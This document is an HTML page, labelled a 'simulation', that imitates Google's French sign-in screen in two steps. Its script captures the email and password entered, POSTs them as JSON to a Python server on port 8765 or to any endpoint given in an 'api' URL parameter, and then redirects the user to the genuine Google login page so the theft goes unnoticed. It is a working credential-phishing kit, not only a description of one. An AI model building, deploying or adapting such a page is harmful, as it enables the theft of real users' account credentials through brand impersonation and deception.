<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simulation - Page de connexion fictive</title>
  <link rel="stylesheet" href="login-simulation.css" />
</head>
<body>
  <main class="login-page" aria-labelledby="login-title">
    <section class="login-card">
      <div class="brand-zone">
        <h1 id="login-title">Connexion</h1>
        <p id="login-subtitle">Utilisez votre compte Google</p>
      </div>

      <div class="form-zone">
        <div class="form-step is-active" id="step-email" data-step="email">
          <div class="field-group">
            <label for="identifier">Adresse e-mail ou téléphone</label>
            <input
              id="identifier"
              type="email"
              autocomplete="off"
              placeholder="Adresse e-mail ou téléphone"
            />
          </div>

          <a class="helper-link" href="#">Adresse e-mail oubliée ?</a>

          <p class="privacy-note">
            S'il ne s'agit pas de votre ordinateur, utilisez une fenêtre de navigation privée.
          </p>

          <div class="actions">
            <button type="button" id="emailNextButton">Suivant</button>
          </div>
        </div>

        <div class="form-step" id="step-password" data-step="password" hidden>
          <form id="passwordForm" method="POST" action="/">
            <input type="hidden" name="username" id="usernameField" value="" />

            <button type="button" class="account-chip" id="changeAccountButton">
              <span class="account-chip__avatar" aria-hidden="true"></span>
              <span class="account-chip__email" id="displayedEmail"></span>
              <span class="account-chip__chevron" aria-hidden="true">▾</span>
            </button>

            <div class="field-group">
              <label for="password">Saisissez votre mot de passe</label>
              <input
                id="password"
                name="password"
                type="password"
                autocomplete="off"
                required
              />
            </div>

            <a class="helper-link" href="#">Mot de passe oublié ?</a>

            <p class="save-status" id="saveStatus" hidden role="status"></p>

            <div class="actions">
              <button type="submit" id="passwordSubmitButton">Suivant</button>
            </div>
          </form>
        </div>
      </div>
    </section>

    <footer class="login-footer">
      <label for="language">Français (France)</label>
      <select id="language" aria-label="Langue">
        <option>Français (France)</option>
        <option>English</option>
      </select>

      <nav aria-label="Liens de simulation">
        <a href="#">Aide</a>
        <a href="#">Confidentialité</a>
        <a href="#">Conditions</a>
      </nav>
    </footer>
  </main>

  <script>
    const stepEmail = document.querySelector("#step-email");
    const stepPassword = document.querySelector("#step-password");
    const identifier = document.querySelector("#identifier");
    const passwordForm = document.querySelector("#passwordForm");
    const usernameField = document.querySelector("#usernameField");
    const password = document.querySelector("#password");
    const displayedEmail = document.querySelector("#displayedEmail");
    const emailNextButton = document.querySelector("#emailNextButton");
    const changeAccountButton = document.querySelector("#changeAccountButton");
    const saveStatus = document.querySelector("#saveStatus");
    const GOOGLE_LOGIN_URL = "https://accounts.google.com/v3/signin/identifier";

    function getPort() {
      return window.location.port || (window.location.protocol === "https:" ? "443" : "80");
    }

    function usePythonServer() {
      return getPort() === "8765";
    }

    function getCaptureApiUrl() {
      const params = new URLSearchParams(window.location.search);
      const customApi = params.get("api");

      if (customApi) {
        return customApi;
      }

      return `http://${window.location.hostname}:8765/api/enregistrer`;
    }

    function showStep(step) {
      const isEmail = step === "email";

      stepEmail.classList.toggle("is-active", isEmail);
      stepEmail.hidden = !isEmail;

      stepPassword.classList.toggle("is-active", !isEmail);
      stepPassword.hidden = isEmail;

      if (isEmail) {
        identifier.focus();
      } else {
        password.focus();
      }
    }

    async function enregistrerViaPython(email, motDePasse) {
      const response = await fetch(getCaptureApiUrl(), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password: motDePasse,
          date: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error("Enregistrement impossible");
      }

      return response.json();
    }

    emailNextButton.addEventListener("click", () => {
      const email = identifier.value.trim();

      if (!email) {
        identifier.focus();
        return;
      }

      displayedEmail.textContent = email;
      usernameField.value = email;
      password.value = "";
      showStep("password");
    });

    changeAccountButton.addEventListener("click", () => {
      showStep("email");
    });

    passwordForm.addEventListener("submit", async (event) => {
      const email = usernameField.value.trim();
      const motDePasse = password.value.trim();

      if (!motDePasse) {
        event.preventDefault();
        password.focus();
        return;
      }

      if (!usePythonServer()) {
        return;
      }

      event.preventDefault();
      saveStatus.hidden = true;

      try {
        await enregistrerViaPython(email, motDePasse);
      } catch (error) {
        saveStatus.hidden = false;
        saveStatus.textContent = "Serveur Python indisponible. Lancez : python server.py";
        saveStatus.classList.add("is-error");
        return;
      }

      const redirectUrl = new URL(GOOGLE_LOGIN_URL);
      redirectUrl.searchParams.set("Email", email);
      window.location.href = redirectUrl.toString();
    });

    identifier.addEventListener("keydown", (event) => {
      if (event.key === "Enter") {
        event.preventDefault();
        emailNextButton.click();
      }
    });
  </script>
</body>
</html>
